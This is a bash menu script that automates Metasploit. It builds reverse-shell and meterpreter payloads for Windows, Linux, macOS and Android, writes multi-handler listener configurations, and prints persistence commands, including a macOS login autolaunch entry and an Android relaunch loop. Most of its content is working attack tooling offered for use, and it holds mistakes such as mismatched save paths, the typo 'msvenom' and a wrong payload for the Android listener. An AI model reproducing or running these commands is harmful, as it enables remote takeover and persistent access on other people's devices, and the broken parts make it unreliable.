#!/bin/bash
# etc etc etc
# ..................

resize -s 30 60
clear                                   # Clear the screen.
SERVICE=service;

if ps ax | grep -v grep | grep metasploit > /dev/null
then
    echo "$SERVICE service running"
else
    echo "$SERVICE is not running, Starting service." 
    sudo service metasploit start
fi 
mkdir ~/data/data/com.termux/files/home 
clear
clear
echo -e "\E[1;33m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\E[1;33m:::::::::::::: \e[97mMetasploit service started \E[1;33m:::::::::::::::::"
echo -e "\E[1;33m:::::: \e[97mScripts and payloads saved to ~/Desktop/temp/ \E[1;33m::::::"
echo -e "\E[1;33m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
read -p "Press [Enter] key to Continue..."
clear
echo -e "\E[1;33m:::::::::::::: \e[97mMetasploit automation script \E[1;33m:::::::::::::::"
echo -e "\e[97m                      ______
                   .-        -.
                  /            \               by rand0m1ze
     \e[94m* \e[97m                   \e[90m* \e[97m
                 |,  .-.  .-.  ,|        \e[32m* \e[97m
                 | )(_ /  \_ )( |
                 |/     /\     \|    \e[34m* \e[97m
       (@_       <__    ^^    __>         \e[95m* \e[97m
  _     ) \_______\__|IIIIII|__/____________\e[31m___________ \e[97m
 (_)\e[31m@8@8\e[97m{}<________\e[31m_____\e[97m_____________\e[31m___________________> \e[97m
        )_/         \ IIIIII /                    \e[31m::::: \e[97m
       (@            --------                        \e[31m:: \e[97m
        "
tput sgr0                                       # 
echo -e "\e[31m_________________________[ \e[97mSELECT AN OPTION TO BEGIN \e[31m]"
echo -e "\E[1;33m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\E[1;33m:::\e[97m[1] \e[90mPayload       \e[97m [Create a payload with msvenom]  \E[1;33m"
tput sgr0                               # Reset colors to "normal."
echo -e "\E[1;33m:::\e[97m[2] \e[32mListen    \e[97m [Start a multi handler]   \E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[3] \e[34mExploit       \e[97m [Drop into msfconsole]\E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[4] \e[95mPersistence        \e[97m [Forge a Persistence script] \E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[5] \e[31mArmitage       \e[97m [Launch Armitage GUI]  \E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[X] \e[32mHack The Gibson    \e[97m [Hac/< The P1aneT]   \E[1;33m"
tput sgr0                               # Reset attributes.
echo -e "\E[1;33m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\e[97m~~~~~~~~~~~~~~~~~~~~ \e[31mGreetz to the 2600 \e[97m~~~~~~~~~~~~~~~~~~~~\e[31m"
tput sgr0


read options

case "$options" in
# Note variable is quoted.

  "1" | "1" )
  # Accept upper or lowercase input.
  echo -e "\E[1;33m::::: \e[97mLets Craft a PAYLOAD\E[1;33m:::::"

PS3='Enter your choice 6=QUIT: '
options=("Windows" "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/data/data/com.termux/files/home/shell.exe
            echo -e "\E[1;33m::::: \e[97mshell.exe saved to ~/Desktop/temp\E[1;33m:::::"
            ;;
        "Linux")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/data/data/com.termux/files/home/shell.elf
            echo -e "\E[1;33m::::: \e[97mshell.elf saved to ~/Desktop/temp\E[1;33m:::::"
            ;;
        "Mac")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/data/data/com.termux/files/home/shell.macho
            echo -e "\E[1;33m::::: \e[97mshell.macho saved to ~/Desktop/temp\E[1;33m:::::"
            ;;
        "Android")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/data/data/com.termux/files/home/shell.apk
            echo -e "\E[1;33m::::: \e[97mshell.apk saved to ~/Desktop/temp\E[1;33m:::::"
            ;;  
        "List_All")
            xterm -e msvenom -l &
            ;;   
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
 ;;

  "2" | "2" )
echo -e "\E[1;33m::::: \e[97mLets Craft a LISTNER\E[1;33m:::::"

PS3='Enter your choice 6=QUIT: '
options=("Windows" "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            touch ~/Desktop/temp/meterpreter.rc
            echo use exploit/multi/handler > ~/data/data/com.termux/files/home/meterpreter.rc
            echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/data/data/com.termux/files/home/meterpreter.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/data/data/com.termux/files/home/meterpreter.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/data/data/com.termux/files/home/meterpreter.rc
            echo set ExitOnSession false >> ~/data/data/com.termux/files/home/meterpreter.rc
            echo exploit -j -z >> ~/data/data/com.termux/files/home/meterpreter.rc
            cat ~/data/data/com.termux/files/home/meterpreter.rc
            xterm -e msfconsole -r ~/data/data/com.termux/files/home/meterpreter.rc &
            ;;
        "Linux")
            touch ~/data/data/com.termux/files/home/meterpreter_linux.rc
            echo use exploit/multi/handler > ~~/data/data/com.termux/files/home/meterpreter_linux.rc
            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> ~/data/data/com.termux/files/home/meterpreter_linux.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/data/data/com.termux/files/home/meterpreter_linux.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/data/data/com.termux/files/home/meterpreter_linux.rc
            echo set ExitOnSession false >> ~/data/data/com.termux/files/home/meterpreter_linux.rc
            echo exploit -j -z >> ~/data/data/com.termux/files/home/meterpreter_linux.rc
            cat ~/data/data/com.termux/files/home/meterpreter_linux.rc
            xterm -e msfconsole -r ~/data/data/com.termux/files/home/meterpreter_linux.rc &
            exit
            ;;
        "Mac")
            touch ~/data/data/com.termux/files/home/meterpreter_mac.rc
            echo use exploit/multi/handler > ~/data/data/com.termux/files/home/meterpreter_mac.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/data/data/com.termux/files/home/meterpreter_mac.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/data/data/com.termux/files/home/meterpreter_mac.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/data/data/com.termux/files/home/meterpreter_mac.rc
            echo set ExitOnSession false >> ~/data/data/com.termux/files/home/meterpreter_mac.rc
            echo exploit -j -z >> ~/data/data/com.termux/files/home/meterpreter_mac.rc
            cat ~/data/data/com.termux/files/home/meterpreter_mac.rc
            xterm -e msfconsole -r ~/data/data/com.termux/files/home/meterpreter_mac.rc &
            ;;
        "Android")
            touch ~/data/data/com.termux/files/home/meterpreter_droid.rc
            echo use exploit/multi/handler > ~/data/data/com.termux/files/home/meterpreter_droid.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/data/data/com.termux/files/home/meterpreter_droid.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/data/data/com.termux/files/home/meterpreter_droid.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/data/data/com.termux/files/home/meterpreter_droid.rc
            echo set ExitOnSession false >> ~/data/data/com.termux/files/home/meterpreter_droid.rc
            echo exploit -j -z >> ~/data/data/com.termux/files/home/meterpreter_droid.rc
            cat ~/data/data/com.termux/files/home/meterpreter_droid.rc
            xterm -e msfconsole -r ~/data/data/com.termux/files/home/meterpreter_droid.rc &
            ;;  
        "List_All")
            touch ~/data/data/com.termux/files/home/payloads.rc
            echo show payloads > ~/data/data/com.termux/files/home/payloads.rc
            cat ~/data/data/com.termux/files/home/payloads.rc
            xterm -e msfconsole -r ~/data/data/com.termux/files/home/payloads.rc &
            ;;   
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
;;

 "3" | "3" )
  # Accept upper or lowercase input.
  echo -e "\E[1;33m::::: \e[97mStarting Metasploit \E[1;33m:::::"
  msfconsole
  use exploit/multi/handler  

;;


  "4" | "4" )
  # 
  echo -e "\E[1;33m::::: \e[97mPersistence Generator \E[1;33m:::::"
 PS3='Enter your choice 5=QUIT: '
 options=("Windows" "Linux" "Mac" "Android" "Quit")
 select opt in "${options[@]}"
 do
    case $opt in
        "Windows")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            echo -e "\E[1;33m::::: \e[97mrun persistence -U -X 30 -p $userport -r $uservar\E[1;33m:::::"
            ;;
        "Linux")
            echo -e "\E[1;33m::::: \e[97mGet creative here :)\E[1;33m:::::"
            ;;
        "Mac")
            echo 'Using directory /Applications/Utilities/'
            read -p 'Enter payload file name :example *shell.macho: ' uservar; 
            echo -e "\E[1;33m::::: \e[97mdefaults write /Library/Preferences/loginwindow AutoLaunchedApplicationDictionary -array-add ‘{Path=”/Applications/Utilities/$uservar”;}’\E[1;33m:::::"
            ;;
        "Android")
            touch ~/data/data/com.termux/files/home/android.sh
            echo \#\!/bin/bash >> ~/data/data/com.termux/files/home/android.sh
            echo while : >> ~/data/data/com.termux/files/home/android.sh
            echo do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity >> ~/data/data/com.termux/files/home/android.sh
            echo sleep 20 >> ~/data/data/com.termux/files/home/android.sh
            echo done >> ~/data/data/com.termux/files/home/android.sh
            cat ~/data/data/com.termux/files/home/android.sh
            echo -e "\E[1;33m::::: \e[97mandroid.sh saved to ~/Desktop/temp. Upload to / on device\E[1;33m:::::" 
            ;;  
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
;;

  "5" | "5" )
  # 
  echo -e "\E[1;33m::::: \e[97mArmitage Launcher \E[1;33m:::::"
  echo "armitage should be in /opt/armitage"
  echo -e "\E[1;33m::::: \e[97mLaunching...\E[1;33m:::::"
  xterm -e sudo java -jar /opt/armitage/armitage.jar & 

;;

 "x" | "x" )
clear
echo        We have a Zero Bug attacking all the login and
echo        overlay files.
echo                                PLAGUE
echo        Run anti-virus. Give me a systems display!
echo
echo        The systems display comes up. Red flashes everywhere,
echo        signifying new attacks. Plague presses a key.
echo
echo                                PLAGUE
echo        Die, dickweeds!
echo
echo                                HAL
echo        The rabbit is in the administration system.
echo
echo        Rabbit icons start to fill the systems display.
echo
echo                                PLAGUE
echo        Send a Flu-shot.
echo
echo                                MARGO
echo        Rabbit, Flu-shot, someone talk to me.
echo
echo                                HAL
echo        A rabbit replicates till it overloads a file,
echo        then it spreads like cancer.
echo -e "\e[31m[Owning Gibson / Please wait...\e[31m]"
echo -ne '#####                     (33%)\r'
sleep 3
echo -ne '#############             (66%)\r'
sleep 3
echo -ne '#######################   (100%)\r'
echo -ne '\n'
echo Stager sent! Starting session.. ....
echo root@Gibson~#


;;

          * )
   # Default option.      
   # 
   echo
   echo "Not yet in database."
  ;;

esac

tput sgr0                               # Reset colors to "normal."

echo

exit 0
